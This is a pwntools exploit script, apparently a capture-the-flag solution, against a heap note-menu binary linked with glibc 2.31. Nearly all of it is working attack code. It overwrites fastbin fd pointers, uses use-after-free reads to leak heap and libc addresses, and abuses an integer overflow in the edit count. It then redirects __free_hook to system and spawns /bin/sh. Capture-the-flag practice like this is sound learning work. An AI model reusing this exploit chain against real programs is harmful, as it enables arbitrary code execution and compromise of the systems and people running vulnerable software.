#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chall')
libc = ELF('./libc-2.31.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
set directories /opt/glibc-2.31/
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# FORTIFY:  Enabled

def menu_choice(opt: int) -> None:
    io.sendlineafter(b"Choice: ", str(opt).encode())

def create(idx: int, size: int, content: bytes) -> None:
    menu_choice(1)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendlineafter(b"Content", content)

def edit(idx: int, offset: int, count: int, content: bytes) -> None:
    menu_choice(2)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Offset: ", str(offset).encode())
    io.sendlineafter(b"Count: ", str(count).encode())
    io.sendlineafter(b"Content", content)

def print_note(idx: int) -> bytes:
    menu_choice(3)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.recvuntil(b"Content: ")
    return io.recvuntil(b"\n", drop=True)

def delete(idx: int) -> None:
    menu_choice(4)
    io.sendlineafter(b"Index: ", str(idx).encode())

io = start()

max_int = 0x7fffffff
min_int = -0x7fffffff

chunk_size = 0x70

# fill tcache, we can free the chunk just after creation as calloc doesn't use tcache
for _ in range(7):
    create(0, chunk_size, chr(0x41+_).encode())
    delete(0)

# prepare layout
log.info("0x0 Preparing heap layout")
create(0, chunk_size, b"A"*10)
create(1, chunk_size, b"B"*10)
create(2, chunk_size, b"C"*10)
create(3, chunk_size, b"D"*10) # prevent chunk consolidation
# fill fastbins
delete(0)
delete(2)

# overwrite fd pointer
log.info("0x1 Overwriting chunks fd pointer")
chunk_addr = p8(0x90)
payload = b"\x00"*(0x70-8)+p64(0)+p64(0x81)+chunk_addr
edit(1, 8, max_int, payload)
create(0, chunk_size, b"E"*10)
create(2, chunk_size, b"F"*10)

# use after free
log.info("0x2 Leaking heap address / UAF")
delete(0)
delete(1)
heap_leak = u64(print_note(2)[:6].ljust(8, b"\x00"))
log.success(f"Got heap leak: {hex(heap_leak)}")

# clean
edit(2, 0, 0x20, b"\x00"*0x10)
delete(3)
delete(2)

# abuse double free and UAF to leak libc 
# TODO (why does the chunk land in smallbins after second allocation????)
create(0, chunk_size, b"\x00")
create(1, 0x400, b"B")
libc_leak = u64(print_note(0)[:6].ljust(8, b"\x00"))

libc_offset = 0x1ebc50
libc.address = libc_leak - libc_offset
log.success(f"libc @ {hex(libc.address)}")

log.info("Cleaning...")
create(2, chunk_size, b"\x00"*0x10)
create(3, chunk_size, b"\x00"*0x10)
delete(0)
delete(3)
delete(2)
delete(1)

log.info("0x3 Moving to 0x60 chunks and overwriting malloc_hook")
chunk_size = 0x60

for _ in range(7):
    create(0, chunk_size, chr(0x41+_).encode())
    delete(0)

# prepare layout
log.info("0x4 Preparing heap layout")
create(0, chunk_size, b"A"*10)
create(1, chunk_size, b"B"*10)
create(2, chunk_size, b"C"*10)
create(3, chunk_size-0x10, b"D"*10) # prevent chunk consolidation

# fill fastbins
delete(0)
delete(2)

# overwrite fd pointer
log.info("0x5 Overwriting chunks fd pointer")
heap_offset = 0x900
chunk_addr = p64(heap_leak+heap_offset)
payload = b"\x00"*(chunk_size-8)+p64(0)+p64(0x71)+chunk_addr
edit(1, 8, max_int, payload)
create(0, chunk_size, b"E"*10)
create(2, chunk_size, b"F"*10)

delete(0)
delete(1)

log.info("0x6 Overwriting fastbin chunk fd pointer with __malloc_hook - 0x33")
edit(2, 0, 0x10, p64(libc.sym["__malloc_hook"]-0x33))
create(0, chunk_size, b"E"*10)
create(1, chunk_size, b"E"*10)
delete(3)
create(3, chunk_size, b"\x00"*0x23)

log.info("0x7 Overwriting __free_hook using integer overflow in epos count")
free_hook_offset = 0x2fdb
edit(3, free_hook_offset, max_int, p64(libc.sym["system"]))
delete(0)
create(0, chunk_size, b"/bin/sh\x00")
delete(0)

io.interactive()

